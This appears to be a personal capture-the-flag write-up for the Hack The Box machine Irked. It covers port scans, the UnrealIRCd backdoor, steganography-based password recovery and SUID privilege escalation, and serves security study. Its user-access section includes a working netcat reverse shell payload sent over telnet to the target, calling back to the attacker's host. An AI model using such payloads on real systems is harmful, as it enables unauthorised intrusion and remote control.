# Enumerate

## Scan

* full port scan shows a handful of ports
* Detailed shows:

```
pat@kali:~/Desktop/Cert_Prep/htb/Linux/Irked$ sudo nmap -p 22,80,111,6697,8067,34830,65534 -sC -sV -O  10.10.10.117 --max-retries=3 -oN nmap_scan.txt
[sudo] password for pat: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-06 12:16 EDT
Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 85.71% done; ETC: 12:17 (0:00:02 remaining)
Nmap scan report for 10.10.10.117
Host is up (0.028s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519) 
80/tcp    open  http    Apache httpd 2.4.10 ((Debian)) 
|_http-server-header: Apache/2.4.10 (Debian) 
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)            
| rpcinfo:                 
|   program version    port/proto  service 
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind           
|   100000  3,4          111/tcp6  rpcbind                                                   
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34830/tcp   status 
|   100024  1          40278/tcp6  status
|   100024  1          46929/udp6  status
|_  100024  1          54340/udp   status 
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
34830/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.4 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 4.8 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.48 seconds
```

## Service Enumeration

* Webpage just looks like a shout out to there being IRC since that's not standard ports. 
* RPCInfo. Same as if I do port 111

```
pat@kali:~/Desktop/Cert_Prep/htb/Linux/Irked$ rpcinfo -n 34830 10.10.10.117
   program version netid     address                service    owner
    100000    4    tcp6      ::.0.111               portmapper superuser
    100000    3    tcp6      ::.0.111               portmapper superuser
    100000    4    udp6      ::.0.111               portmapper superuser
    100000    3    udp6      ::.0.111               portmapper superuser
    100000    4    tcp       0.0.0.0.0.111          portmapper superuser
    100000    3    tcp       0.0.0.0.0.111          portmapper superuser
    100000    2    tcp       0.0.0.0.0.111          portmapper superuser
    100000    4    udp       0.0.0.0.0.111          portmapper superuser
    100000    3    udp       0.0.0.0.0.111          portmapper superuser
    100000    2    udp       0.0.0.0.0.111          portmapper superuser
    100000    4    local     /run/rpcbind.sock      portmapper superuser
    100000    3    local     /run/rpcbind.sock      portmapper superuser
    100024    1    udp       0.0.0.0.231.67         status     107
    100024    1    tcp       0.0.0.0.187.172        status     107
    100024    1    udp6      ::.236.150             status     107
    100024    1    tcp6      ::.209.206             status     107
```



* Unreal on 6697
* Use irssi and then connect to get the unreal version

```
irssi -> /connect 10.10.10.117 6697
```

* Version 3281
* that version has a backdoor vuln. 

# User Access

* use 13853.pl
* For some reason it's not obvious what it's going to connect to, just change the payload 2 to be a reverse shell that I want. And then for some reason it doesn't work anyway. Just use my own. 

```
pat@kali:~/Desktop/Cert_Prep/htb/Linux/Irked$ telnet 10.10.10.117 6697
Trying 10.10.10.117...
Connected to 10.10.10.117.
Escape character is '^]'.
:irked.htb NOTICE AUTH :*** Looking up your hostname...
AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 1234 >/tmp/f
```

* Also made a python script to connect and send the info over telnet. 

# Escalation

## IRCD to djmardov

* if I'm stuck, maybe not even supposed to get the ircd first and it's just a troll. 
* Maybe I can brute force rpcclient? 
* Eventually find this:

```
ircd@irked:/home/djmardov$ cat Documents/.backup
cat Documents/.backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

* That doesn't work for su djmardov or ssh
* Not much interesting in linpeas output. 
* Use steghide with that to get something out of the picture on the homepage

```
steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
wrote extracted data to "pass.txt".
```

* that pass.txt works for ssh, get user flag. 

## djmardov to root

* no sudo -l

* nothing in crontab

* Run linpeas again I guess. 

  * Some stuff about proc 17700 doing sed on all my files? 

  ```
  [+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
  [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data       -rw-r--r-- 1 root root 1863 Nov  5  2016 /etc/bash.bashrc 
  -rw-r--r-- 1 root root 3515 Nov  5  2016 /etc/skel/.bashrc
  -rw-r--r-- 1 root root 675 Nov  5  2016 /etc/skel/.profile
  -rw-r--r-- 1 root root 1208 May 27  2017 /etc/w3m/config
  lrwxrwxrwx 1 root root 9 Nov  3  2018 /home/djmardov/.bash_history -> /dev/null
  Looking for possible passwords inside /home/djmardov/.bash_history (limit 100)
  -rw-r--r-- 1 djmardov djmardov 3515 May 11  2018 /home/djmardov/.bashrc
  -rw-r--r-- 1 djmardov djmardov 675 May 11  2018 /home/djmardov/.profile
  -rw-r--r-- 1 ircd ircd 0 May 14  2018 /home/ircd/.bashrc
  -rwxr-xr-x 1 root root 2493 Nov  8  2014 /usr/bin/lft.db
  -rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc
  -rw-r--r-- 1 root root 870 May 15  2012 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
  -rw-r--r-- 1 root root 1865 May 15  2012 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
  ```

* There might be a kernel exploit but that's probably not it. 

* Might be this metasploit portmapper thing, I saw somewhere it was running sunRPC? Read writeup since this is only metasploit. Nope

* Didn't notice the SUID binaries from linpeas, but I assume they were there? See lessons.

* Two potential interesting files:

  * chsh - this might be standard? Couldn't do anything with it. 
  * viewuser - this seems to just run a file. Make an executable bash script to return a shell and get root.

# Lessons

* Add a suid binary check to the always things to do. Check any non-standard things. 



